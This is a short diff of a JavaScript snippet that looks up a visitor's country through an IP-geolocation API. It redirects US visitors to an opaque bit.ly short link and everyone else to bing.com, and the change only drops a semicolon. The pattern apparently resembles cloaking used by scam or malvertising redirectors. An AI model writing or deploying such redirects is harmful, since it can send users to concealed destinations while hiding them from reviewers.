@@ -3,7 +3,7 @@ $.get("https://api.ipdata.co?api-key=test", function (response) {
   if (response.country_code == 'US') {
     window.location.href = "https://bit.ly/3rk7ikn";
   }
-  else{window.location.href = "http://bing.com/";};
+  else{window.location.href = "http://bing.com/";}
 }, "jsonp");
 
 /*var request = new XMLHttpRequest();
